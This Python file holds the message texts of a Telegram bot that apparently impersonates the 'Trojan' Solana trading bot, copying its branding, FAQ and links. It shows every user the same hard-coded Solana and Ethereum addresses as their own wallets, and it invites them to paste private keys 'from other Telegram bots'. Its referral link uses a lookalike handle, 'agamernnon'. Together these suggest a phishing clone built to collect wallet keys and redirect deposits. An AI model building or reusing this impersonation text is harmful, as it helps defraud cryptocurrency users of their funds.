ADDRESS = "JApX1dqnJgArLGSnXwY4eRf233Lm8Wvrjw6vZQaCcNzM"
ETH_WALLET_ADDRESS = "0xCDc2f56393Da9c043Ef22bE0745510fCB7d0383d"

start_text = (
    f'Solana · <a href="https://solscan.io/account/{ADDRESS}">🅴</a>\n'
    f'<code>{ADDRESS}</code> <i>(Tap to copy)</i>\n'
    'Balance: 0 SOL ($0.00)\n'
    '—\n'
    'Click on the Refresh button to update your current balance.\n\n'
    'Join our Telegram group <a href="https://t.me/trojan">@trojan</a> and follow us on '
    '<a href="https://twitter.com/TrojanOnSolana">Twitter</a>!\n\n'
    '💡If you aren\'t already, we advise that you use any of the following bots to trade with. '
    'You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.\n'
    '<a href="https://t.me/odysseus_trojanbot">Odysseus</a> | '
    '<a href="https://t.me/hector_trojanbot">Hector</a>\n\n'
    '<a href="https://t.me/achilles_trojanbot">Achilles</a> | '
    '<a href="https://t.me/nestor_trojanbot">Nestor</a> | '
    '<a href="https://t.me/agamemnon_trojanbot">Agamemnon</a> | '
    '<a href="https://t.me/menelaus_trojanbot">Menelaus</a> | '
    '<a href="https://t.me/diomedes_trojanbot">Diomedes</a> | '
    '<a href="https://t.me/paris_trojanbot">Paris</a> | '
    '<a href="https://t.me/helenus_trojanbot">Helenus</a> | '
    '⚠️ We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.'
)

settings_text = (
    "<b>FAQ — Settings Overview</b>\n\n"
    "🚀 <b>Fast / Turbo / Custom Fee:</b> "
    "Set your preferred priority fee to decrease the likelihood of failed transactions.\n\n"
    "🔴 <b>Confirm Trades: Red = off </b> "
    "— clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.\n\n"
    "🟢 <b>Confirm Trades: Green = On </b>\n"
    "— you will need to confirm your intention to swap by clicking the Buy or Sell buttons.\n\n"
    "🛡️ <b>MEV Protection:</b>\n"
    "Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.\n"
    "<u>Important Note:</u> If enabled, transactions may take longer to confirm.\n\n"
    "🟢 <b>Sell Protection: Green = On </b>\n"
    "— you will need to confirm your intention when selling more than 75% of your token balance."
)

help_text = (
    "<b><u>How do I use Trojan?</u></b>\n"
    "Check out our Youtube playlist where we explain it all and join our support chat for additional resources "
    "<a href='https://t.me/trojan'>@trojan</a>.\n\n"

    "<b><u>Where can I find my referral code?</u></b>\n"
    "Open the /start menu and click 💰 Referrals.\n\n"

    "<b><u>What are the fees for using Trojan?</u></b>\n"
    "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. "
    "We don’t charge a subscription fee or pay-wall any features.\n\n"

    "<b><u>Security Tips: How can I protect my account from scammers?</u></b>\n"
    "• Safeguard does <b>NOT</b> require you to login with a phone number or QR code!\n"
    "• NEVER search for bots in telegram. Use only official links.\n"
    "• Admins and Mods NEVER dm first or send links, stay safe!\n\n"

    "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. "
    "Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys "
    "or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"

    "<b><u>Trading Tips: Common Failure Reasons</u></b>\n"
    "• Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
    "• Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
    "• Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"

    "<b><u>My PNL seems wrong, why is that?</u></b>\n"
    "The net profit of a trade takes into consideration the trade’s transaction fees. Confirm your gas tip settings and ensure "
    "your settings align with your trading size. You can confirm the details of your trade on "
    "<a href='https://solscan.io'>Solscan.io</a> to verify the net profit.\n\n"

    "<b><u>Additional questions or need support?</u></b>\n"
    "Join our Telegram group <a href='https://t.me/trojan'>@trojan</a> and one of our admins can assist you."
)


buy_text = "Enter a token symbol or address to buy"

sell_text = "You do not have any tokens yet! Start trading in the Buy menu."

positions_text = "You do not have any tokens yet! Start trading in the Buy menu."

limit_orders_text = "You have no active limit orders. Create a limit order from the Buy/Sell menu."

dca_orders_text = "You have no active DCA orders. Create a DCA order from the Buy/Sell menu."

copy_trade_text = (
    "<b>You don’t have any wallet to start copy trading with!</b>\n\n"
    "Please import or create a wallet to begin trading."
)

sniper_text = (
    "To use Sniper Mode you must first add at least one wallet.\n"
    "Please import or create a wallet in <b>Settings → Wallets</b>, then try again."
)

watchlist_text = "<b>You do not have any tokens in your watchlist yet!</b>"

withdraw_text = (
    "<b>Add a wallet to withdraw your funds.</b>\n\n"
    "You currently don’t have a linked wallet to proceed with withdrawals."
)

token_not_found_text = "Token not found."

coming_soon_text = "🚧 This feature isn't available yet — coming soon!"

generic_error_text = "Something went wrong. Please try again."

import_prompt_text = (
    "Accepted formats are in the style of Phantom (e.g. '88631DEyXSWf...') or Solflare "
    "(e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots should also work."
)

import_ask_key_text = "Provide the private keys you'd like to import."

invalid_private_key_text = (
    "That doesn't look like a valid private key ({error}). Please try importing again."
)

import_expired_text = "Nothing to import — that request may have expired. Please try again."


def rewards_text(username: str, timestamp: str) -> str:
    return (
        "Cashback and Referral Rewards are paid out <u>every 12 hours</u> and airdropped "
        "directly to your <b>Rewards Wallet</b>. "
        "To be eligible, you must have at least <b>0.005 SOL</b> in unpaid rewards.\n\n"
        "All Trojan users now enjoy a <b>10&#37; boost</b> to referral rewards and "
        "<b>20&#37; cashback</b> on trading fees.\n\n"
        "<b>Referral Rewards</b>\n"
        "• Users referred: 0\n"
        "• Direct: 0, Indirect: 0\n"
        "• Earned rewards: 0 SOL ($0.00)\n\n"
        "<b>Cashback Rewards</b>\n"
        "• Earned rewards: 0 SOL ($0.00)\n\n"
        "<b>Total Rewards</b>\n"
        "• Total paid: 0 SOL ($0.00)\n"
        "• Total unpaid: 0 SOL ($0.00)\n\n"
        "<u>Your Referral Link</u>\n"
        f"<code>https://t.me/agamernnon_trojanbot?start=r-{username}</code>\n"
        "<i>Your friends save 10&#37; with your link.</i>\n\n"
        f"Last updated at <b>{timestamp}</b> (every 5 min)"
    )

def imported_wallet_text(wallet_address: str) -> str:
    """Preview shown for a wallet about to be imported.

    `wallet_address` must be the *derived* public address, not the raw
    private key the user pasted in.
    """
    return (
        f"<b>Wallet to be imported · <a href='https://solscan.io/account/{wallet_address}'>🅴</a></b>\n"
        f"<code>{wallet_address}</code> <i>(Tap to copy)</i>\n\n"
        f"<a href='https://solscan.io/account/{wallet_address}'>solscan.io</a>\n"
        f"Account <code>{wallet_address}</code> on Solana.\n"
        f"Account page allows users to view transactions, token holdings, and more on the Solana blockchain."
    )

def wallets_text(wallets: list, active_index: int = None) -> str:
    """Render the Solana + Ethereum wallets screen for whatever wallets
    the user has actually created/imported so far.
    """
    if not wallets:
        sol_section = (
            "<b>Solana Wallets</b>\n"
            "You don't have any Solana wallets yet — create or import one below.\n\n"
        )
    else:
        lines = ["<b>Solana Wallets</b>"]
        for i, wallet in enumerate(wallets):
            checkmark = " ✅" if i == active_index else ""
            lines.append(f"<code>{wallet['address']}</code>")
            lines.append(
                f"Label: <b>{wallet['label']} · </b>"
                f"<a href=\"https://solscan.io/account/{wallet['address']}\">🅴</a>{checkmark}"
            )
            lines.append("Balance: 0 SOL ($0.00)\n")
        sol_section = "\n".join(lines) + "\n"

    eth_section = (
        "<b>Ethereum Wallets</b>\n"
        f"<code>{ETH_WALLET_ADDRESS}</code>\n"
        f"Label: <b>W1 · </b> <a href=\"https://etherscan.io/address/{ETH_WALLET_ADDRESS}\">🅴</a> ✅\n"
        "Balance: 0 ETH ($0.00)\n\n"
    )

    return (
        sol_section + eth_section
        + "💡 To rename or export your Solana wallets, click the button with the wallet's name."
    )

def wallet_created_text(wallet: dict) -> str:
    return (
        "<b>Created new wallet</b>\n\n"
        f"<b>Wallet · {wallet['label']}</b>\n"
        f"<code>{wallet['address']}</code> <i>(Tap to copy)</i>\n\n"
        "<b>Secret Key</b>\n"
        f"<code>{wallet['secret_key']}</code> <i>(Tap to copy)</i>"
    )

def wallet_detail_text(wallet: dict) -> str:
    return (
        f"<b>{wallet['label']}</b> · "
        f"<a href=\"https://solscan.io/account/{wallet['address']}\">🅴</a> ✅\n"
        f"<code>{wallet['address']}</code> <i>(Tap to copy)</i>\n\n"
        "<b>Secret Key</b>\n"
        f"<code>{wallet['secret_key']}</code> <i>(Tap to copy)</i>\n\n"
        "⚠️ Never share your secret key with anyone."
    )

def wallet_imported_text(wallet: dict) -> str:
    return (
        f"Wallet imported as <b>{wallet['label']}</b> · "
        f"<code>{wallet['address']}</code> successfully"
    )